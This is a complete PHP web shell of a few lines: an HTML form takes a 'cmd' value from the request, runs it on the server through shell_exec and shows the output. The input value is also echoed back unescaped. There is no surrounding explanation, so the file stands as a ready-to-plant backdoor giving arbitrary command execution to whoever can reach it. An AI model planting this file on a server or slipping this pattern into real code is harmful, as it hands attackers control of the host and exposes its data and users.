
<form>

    <input autofocus name="cmd" value="<?= $_REQUEST['cmd'] ?>">

    <input type="submit">

</form>

<pre><?= shell_exec($_REQUEST['cmd']); ?></pre>
